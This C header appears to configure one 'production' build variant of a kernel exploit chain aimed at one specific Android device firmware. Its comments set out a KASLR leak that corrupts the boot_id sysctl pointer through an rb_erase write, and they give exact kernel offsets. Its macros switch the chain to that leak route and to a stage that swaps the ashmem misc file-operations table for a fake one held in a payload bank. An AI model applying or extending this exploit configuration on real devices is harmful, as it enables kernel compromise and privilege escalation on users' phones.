#include "../q6q-F9560ZCU3DZDP-v17/target.h"

/* v18: boot_id slide route - the kp16 fix.
 *
 * kp16 (v17 attempt 1) proved the physical fingerprint probe is structurally
 * impossible on q6q: the probe page's struct page sits inside the absent
 * vmemmap section covering phys [0x80000000, 0x88000000), which contains the
 * ENTIRE kernel Image span, so no Image page has a readable struct page
 * (pmd=0 at 0xfffffffe0207a010, FSC 0x06 level-2 translation fault).
 *
 * The original non-physical slide route does not touch struct pages at all:
 * the sched-trigger chain's rb_erase tree erase writes
 * [boot_id-data-ptr-slot] = nfulnl_logger-object, both expressed as LINEAR
 * ALIASES (P0_DATA_ALIAS_CONST: PAGE_OFFSET + phys), which are ordinary
 * mapped+writable Image .data addresses; /proc/sys/kernel/random/boot_id
 * then returns the logger object's first qword = the "nfnetlink_log" name
 * pointer, giving stext = leaked - 0x016a6574.  Offline ELF verification
 * confirmed the q6q layout byte-for-byte against the validated e3q record:
 * name string "nfnetlink_log" @ 0x016a6574, nfulnl_logger @ 0x02242a20
 * (+0x00 = name pointer, +0x08 = 1), boot_id data-ptr slot @ 0x023762f0
 * holding 0xffffffc00a6046e8 = sysctl_bootid storage @ 0x026046e8.
 *
 * Changes vs v17:
 * - APP_SLIDE_BOOTID_ROUTE: slide_leak_kernel_base() tries the boot_id
 *   route (fresh reclaim + the pselect/requeue dance with the boot_id fd-set
 *   words, over the SLIDE_P0_OFFSET_CANDIDATES loop) before falling back to
 *   the physical probe.  The leak is self-validating: slide_commit_stext
 *   only accepts a canonical 0xffff.. pointer whose slide equals the danced
 *   candidate.
 * - APP_FOPS_REUSE_VERIFIED_PAGE is undefined: the verified-page reuse path
 *   depends on the physical probe session; the FOPS stage prepares fresh.
 * - APP_FOPS_DATA_ALIAS_DIAG_ONLY is undefined: the alias verification's
 *   probe slot uses direct_to_page(data_addr(ASHMEM_MISC_FOPS)) - an Image
 *   struct page inside the vmemmap hole - so the FOPS stage goes straight to
 *   the production geometry (parent = fake_fops in the payload bank, target
 *   = data_addr(ASHMEM_MISC_FOPS)), which involves no struct pages.
 *   APP_FOPS_DEFER_ALIAS_READBACK (part of the same diag machinery) is
 *   undefined with it.
 * - The fresh-P0-session gate accepts a boot_id-sourced slide (the FOPS
 *   stage still builds its own fresh P0 state in-process).
 * The v17 write_window gate is kept, scoped to vmemmap-parent triggers
 * (the slide-stage markers whose parent is a struct page); the FOPS
 * production trigger (parent = fake_fops in the payload bank) keeps the
 * e2s-proven sched_ok acceptance.
 */
#define APP_SLIDE_BOOTID_ROUTE 1
#define APP_SLIDE_NOPHYS_ROUTE 1
#undef APP_FOPS_REUSE_VERIFIED_PAGE
#undef APP_FOPS_DATA_ALIAS_DIAG_ONLY
#undef APP_FOPS_DATA_ALIAS_GATE_VERIFY
#undef APP_FOPS_DEFER_ALIAS_READBACK

#undef BUILD_VARIANT_LABEL
#define BUILD_VARIANT_LABEL \
  "q6q-F9560ZCU3DZDP-app-production-v18-bootid-slide"
